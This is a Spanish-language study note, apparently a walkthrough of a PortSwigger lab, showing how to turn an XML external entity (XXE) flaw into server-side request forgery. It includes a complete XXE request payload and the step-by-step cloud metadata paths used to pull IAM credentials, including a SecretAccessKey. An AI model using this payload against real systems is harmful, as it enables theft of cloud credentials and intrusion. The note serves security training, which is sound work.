---
aliases:
  - XXE 002 - SSRF a metadata cloud
  - xxe ssrf 169.254.169.254
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 002 — XXE → SSRF a la metadata de la nube

> Lab: [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) · **Apprentice** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]] · relación → [[vulnerabilities/007-ssrf/README|SSRF]]

## ¿Por qué acá?
- **Vengo de [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]]:** la entidad externa reflejada funciona.
- **Qué cambia:** el objetivo **no es un archivo local** sino un **recurso interno** (metadata cloud, `localhost`) al que solo el server llega.
- **Entonces:** misma técnica, pero `http://` en vez de `file://` → el server hace la request **por mí** (SSRF).

## Cómo explotarlo

> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).

**Paso 1 — apuntar a la raíz de la metadata:**
<pre><code>POST /product/stock HTTP/1.1
Host: <mark>TARGET.web-security-academy.net</mark>
Content-Type: application/xml

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "<mark>http://169.254.169.254/</mark>"&gt; ]&gt;
&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
La respuesta refleja el siguiente segmento (p.ej. `latest`).

**Paso 2 — bajar la ruta** cambiando la URL de la entidad:
<pre><code>http://<mark>169.254.169.254</mark>/latest/meta-data/iam/security-credentials/
http://<mark>169.254.169.254</mark>/latest/meta-data/iam/security-credentials/<mark>admin</mark>   ← nombre del rol</code></pre>
El último devuelve el JSON con la **`SecretAccessKey`**.

## Verificación
Cada request refleja el contenido de esa URL interna.

## Detalles que se pasan por alto
- **Se navega la ruta a mano**, segmento por segmento; el nombre del rol (`admin`) sale del penúltimo paso.
- `http://` (no `file://`) → esto es SSRF, no lectura de archivo.
- Sirve para cualquier servicio **interno** (`localhost:PORT`, dashboards).

→ **Siguiente:** ¿y si **no controlo el XML entero** (no puedo poner DOCTYPE)? → [[vulnerabilities/006-xxe/examples/003-xinclude-sin-controlar-el-xml|003 — XInclude]].
